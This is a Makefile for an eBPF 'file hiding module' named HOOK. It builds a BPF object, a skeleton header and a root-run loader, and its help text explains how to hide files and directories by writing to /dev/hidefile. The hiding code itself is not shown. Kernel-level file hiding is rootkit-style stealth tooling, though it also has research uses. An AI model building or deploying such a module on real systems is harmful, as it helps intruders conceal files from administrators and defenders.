# HOOK eBPF Makefile
# File hiding module using eBPF

MDIR := $(abspath $(dir $(lastword $(MAKEFILE_LIST))))

# Toolchain
CLANG ?= clang
LLC ?= llc
BPFTOOL ?= bpftool
CC ?= gcc
PKG_CONFIG ?= pkg-config

# BPF compilation flags
BPF_TARGET := bpf
BPF_CFLAGS := -Wall -Wno-unused-value -Wno-pointer-sign \
               -Wno-compare-distinct-pointer-types \
               -O2 -target $(BPF_TARGET) -emit-llvm \
               -I$(MDIR)

# Userspace compilation flags  
CFLAGS := -Wall -O2 -g
CFLAGS += $(shell $(PKG_CONFIG) --cflags libbpf 2>/dev/null)
LDFLAGS := $(shell $(PKG_CONFIG) --libs libbpf 2>/dev/null || echo "-lbpf -lelf")

# Output files
BPF_OBJ := $(MDIR)/hook.bpf.o
SKEL_HDR := $(MDIR)/hook.skel.h
VMLINUX_HDR := $(MDIR)/vmlinux.h
LOADER := $(MDIR)/hook_loader

# Sources
BPF_SRC := hook.bpf.c
LOADER_SRC := hook_loader.c

# Default target
.PHONY: all
all: $(LOADER)

# Generate vmlinux.h if not exists
$(VMLINUX_HDR):
	@echo "Note: vmlinux.h not generated (optional for simple BPF programs)"
	@touch $@

# Build BPF object
.PHONY: bpf
bpf: $(BPF_OBJ)

$(BPF_OBJ): $(BPF_SRC) $(VMLINUX_HDR)
	@echo "  CLANG-BPF $(notdir $@)"
	$(CLANG) $(BPF_CFLAGS) -c $< -o - 2>/dev/null | \
		$(LLC) -march=bpf -filetype=obj -o $@ || \
		$(CLANG) $(BPF_CFLAGS) -c $< -o $@

# Generate skeleton header
.PHONY: skeleton
skeleton: $(SKEL_HDR)

$(SKEL_HDR): $(BPF_OBJ)
	@echo "  BPFTOOL gen skeleton $(notdir $@)"
	@$(BPFTOOL) gen skeleton $< > $@ 2>/dev/null || \
		echo "/* Skeleton not generated - run 'make skeleton' with bpftool */"

# Build userspace loader
.PHONY: loader
loader: $(LOADER)

$(LOADER): $(LOADER_SRC) $(SKEL_HDR)
	@echo "  CC $(notdir $@)"
	$(CC) $(CFLAGS) -o $@ $(LOADER_SRC) $(LDFLAGS)

# Build everything
.PHONY: all
all: bpf skeleton loader

# Clean
.PHONY: clean
clean:
	rm -f $(BPF_OBJ) $(SKEL_HDR) $(LOADER) $(VMLINUX_HDR)
	rm -f *.o *.skel.h vmlinux.h

# Help
.PHONY: help
help:
	@echo "HOOK eBPF File Hiding Module"
	@echo ""
	@echo "Targets:"
	@echo "  all      - Build everything (default)"
	@echo "  bpf      - Build BPF object file"
	@echo "  skeleton - Generate BPF skeleton header"
	@echo "  loader   - Build userspace loader"
	@echo "  clean    - Remove build artifacts"
	@echo ""
	@echo "Requirements:"
	@echo "  - clang with BPF target support"
	@echo "  - llvm LLC"
	@echo "  - bpftool"
	@echo "  - libbpf-dev"
	@echo ""
	@echo "Usage:"
	@echo "  sudo ./hook_loader"
	@echo "  echo file > /dev/hidefile"
	@echo "  echo d:dir > /dev/hidefile"
	@echo "  echo clear > /dev/hidefile"
